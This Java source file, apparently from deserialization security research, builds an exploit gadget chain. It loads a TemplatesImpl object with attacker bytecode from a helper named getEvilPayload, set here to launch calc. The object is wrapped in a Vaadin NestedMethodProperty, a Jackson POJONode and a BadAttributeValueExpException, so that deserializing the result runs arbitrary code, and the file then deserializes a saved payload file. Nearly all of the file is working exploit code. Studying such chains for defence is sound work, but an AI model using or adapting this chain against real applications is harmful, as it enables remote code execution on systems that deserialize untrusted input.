package Seri;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.vaadin.data.util.NestedMethodProperty;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

public class VaadinGadgets {
    public static void main(String[] args) throws Exception {
        byte[] bytes = Utils.getEvilPayload("calc");
        TemplatesImpl templates = new TemplatesImpl();
        Utils.setValue(templates , "_bytecodes", new byte[][]{bytes});
        Utils.setValue(templates , "_name", "gadgets");
        Utils.setValue(templates , "_tfactory", new TransformerFactoryImpl());

        NestedMethodProperty nestedMethodProperty = new NestedMethodProperty<>(templates ,"OutputProperties");
        POJONode pojoNode = new POJONode(nestedMethodProperty);

        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
        Utils.setValue(bad, "val", pojoNode);

//        Utils.serialize(bad ,"bin/vaadin.bin");
        Utils.unserialize("bin/vaadin.bin");
    }
}
